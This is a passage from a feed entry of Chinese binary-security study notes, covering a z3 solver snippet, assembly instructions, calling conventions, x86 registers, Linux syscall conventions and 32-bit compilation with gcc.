class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	求解多元方程组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; z3 &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 这里声明变量&lt;/span&gt;&lt;br&gt;a = Int(&lt;span class=&#34;hljs-string&#34;&gt;&#39;a&#39;&lt;/span&gt;)&lt;br&gt;b = Int(&lt;span class=&#34;hljs-string&#34;&gt;&#39;b&#39;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 创建求解器&lt;/span&gt;&lt;br&gt;s = Solver()&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 添加约束条件&lt;/span&gt;&lt;br&gt;s.add(c * b * a - d == &lt;span class=&#34;hljs-number&#34;&gt;36182&lt;/span&gt;)&lt;br&gt;s.add(a==&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(s.check())&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(s.model())&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;容易忘的汇编指令&#34;&gt;&lt;a href=&#34;#容易忘的汇编指令&#34; class=&#34;headerlink&#34; title=&#34;容易忘的汇编指令&#34;&gt;&lt;/a&gt;容易忘的汇编指令&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asm&#34;&gt;leave: &lt;br&gt;	mov esp, ebp;&lt;br&gt;    pop ebp;&lt;br&gt;test eax, eax ; 目的在于将eax进行与运算，**其实本质上来讲就是来检查是不是0**，在程序中经常出现&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;三种函数调用约定&#34;&gt;&lt;a href=&#34;#三种函数调用约定&#34; class=&#34;headerlink&#34; title=&#34;三种函数调用约定&#34;&gt;&lt;/a&gt;三种函数调用约定&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;调用约定的本质是定义函数的参数传递方式，函数的返回值，以及调用后如何返回三项基本内容&lt;/li&gt;
&lt;li&gt;三种调用约定&lt;ul&gt;
&lt;li&gt;__cdecl是C/C++的默认调用方式&lt;ul&gt;
&lt;li&gt;参数使用栈传递，按照顺序从右向左依次进行入栈，主函数负责栈平衡（&lt;strong&gt;也就是谁调用谁负责栈平衡&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;命名方式为下划线加上函数名&lt;/li&gt;
&lt;li&gt;Linux下的主要传参方式&lt;ul&gt;
&lt;li&gt;X86:普通函数直接全都放在栈上传参（从右向左的方式），syscall则是使用 eax当做调用号，ebx,ecx，edx，esi,edi,ebp传入&lt;/li&gt;
&lt;li&gt;X64: 普通函数传参使用的是rdi,rsi,rdx,rcx,r8,r9 syscall系统调用则是使用rax作为系统调用号，其余与普通函数类似&lt;/li&gt;
&lt;li&gt;arm：r0,1,2,3&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;__stdcall是Windows API函数的调用方式&lt;ul&gt;
&lt;li&gt;参数从右向左依次进行入栈，被调用的函数负责栈平衡。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;__fastcall 对性能要求比较高的时候往往使用该方式&lt;ul&gt;
&lt;li&gt;该方式优先使用寄存器（ECX、EDX）和栈传参，剩下的参数再使用栈从右向左传递，&lt;strong&gt;栈平衡由被调用的函数负责&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;快速调用方式使用中的命名规则为@加上函数名@参数大小&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;__thiscall 函数调用方式&lt;/li&gt;
&lt;li&gt;CS都是从右向左入栈调用，fastcall则是优先使用ecx，edx，其余参数从右向左入栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;寄存器&#34;&gt;&lt;a href=&#34;#寄存器&#34; class=&#34;headerlink&#34; title=&#34;寄存器&#34;&gt;&lt;/a&gt;寄存器&lt;/h2&gt;&lt;h3 id=&#34;flags寄存器有哪些位，有什么作用&#34;&gt;&lt;a href=&#34;#flags寄存器有哪些位，有什么作用&#34; class=&#34;headerlink&#34; title=&#34;flags寄存器有哪些位，有什么作用&#34;&gt;&lt;/a&gt;flags寄存器有哪些位，有什么作用&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/272135463?utm_id=0&#34;&gt;https://zhuanlan.zhihu.com/p/272135463?utm_id=0&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#1CF0_59&#34;&gt;1、CF（0）：进位标志位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#2PF2_65&#34;&gt;2、PF（2）：奇偶标志位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#3AF4_70&#34;&gt;3、AF（4）：辅助进位标志&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#4ZF60_75&#34;&gt;4、ZF（6）：0标志位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#5SF7_81&#34;&gt;5、SF（7）：符号标志位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#6TF8_87&#34;&gt;6、TF（8）：追踪标志&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#7IF9_90&#34;&gt;7、IF（9）：中断标志位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#8DF10_93&#34;&gt;8、DF（10）：方向标志位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_38633659/article/details/125192247#9OF11_98&#34;&gt;9、OF（11）：溢出标志位&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;控制寄存器有哪些&#34;&gt;&lt;a href=&#34;#控制寄存器有哪些&#34; class=&#34;headerlink&#34; title=&#34;控制寄存器有哪些&#34;&gt;&lt;/a&gt;控制寄存器有哪些&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;CR0：含有控制处理器操作模式和状态的系统控制标识，它分为两种，一种是协处理器控制位，一种是保护控制位。协处理器控制位包括扩展类型位 ET、任务切换位 TS、仿真位 EM 和数学存在位 MP，用于控制 x86 的浮点，也就是数学协处理器的操作。1&lt;/li&gt;
&lt;li&gt;CR1：保留。2&lt;/li&gt;
&lt;li&gt;CR2：当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会引起异常的线性地址存放在CR2中。&lt;/li&gt;
&lt;li&gt;CR3：页目录基地址寄存器，用来切换和定位当前正在使用的页表。&lt;/li&gt;
&lt;li&gt;CR4：含有与分页机制相关的系统控制标识，包括 PAE 和 PSE 位，用于控制分页的配置。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上寄存器都是 32 位的，各自的作用是与分页机制密切相关，因此，在进程管理及虚拟内存管理中会涉及到这几个寄存器。对控制寄存器的读写是通过 mov 指令来实现&lt;/p&gt;
&lt;h2 id=&#34;系统函数的调用方式&#34;&gt;&lt;a href=&#34;#系统函数的调用方式&#34; class=&#34;headerlink&#34; title=&#34;系统函数的调用方式&#34;&gt;&lt;/a&gt;系统函数的调用方式&lt;/h2&gt;&lt;h3 id=&#34;32位下的系统函数调用&#34;&gt;&lt;a href=&#34;#32位下的系统函数调用&#34; class=&#34;headerlink&#34; title=&#34;32位下的系统函数调用&#34;&gt;&lt;/a&gt;32位下的系统函数调用&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;传参方式：首先将系统调用号传入eax，然后将参数从左到右依次存入ebx、ecx、edx寄存器中，返回值存在eax寄存器中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;调用号：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;sys_read = &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;&lt;br&gt;sys_write = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;&lt;br&gt;sys_execve = &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用int 80h中断进行系统调用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;32位程序编译&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;pre&gt;&lt;code class=&#34;sh&#34;&gt;gcc -m32 -o  testAlign32  testAlign.c
# 如果出现报错/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: 没有那个文件或目录    27 | #include &amp;lt;bits/libc-header-start.h&amp;gt;，则使用以下指令
sudo apt-get install gcc-multilib
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;64位下的系统函数调用&#34;&gt;&lt;a href=&#34;#64位下的系统函数调用&#34; class=&#34;headerlink&#34; title=&#34;64位下的系统函数调用&#34;&gt;&lt;/a&gt;64位下的系统函数调用&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;首先将系统调用号传入rax，然后将参数从左到右依次存入rdi、rsi、rdx寄存器中，返回值存在rax寄存器中&lt;/li&gt;
&lt;li&gt;调用号：sys_read为0，sys_write为1，sys_open为2&lt;/li&gt;
&lt;li&gt;调用方式：使用syscall指令进行系统调用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;linux下程序的加载过程&#34;&gt;&lt;a href=&#34;#linux下程序的加载过程&#34; class=&#34;headerlink&#34; title=&#34;linux下程序的加载过程&#34;&gt;&lt;/a&gt;linux下程序的加载过程&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706670.png&#34; alt=&#34;image-20230316183408668&#34;&gt;&lt;/p&gt;
</content>
        <category term="二进制安全" />
        <updated>2024-04-08T09:05:35.000Z</updated>
    </entry>
</feed>
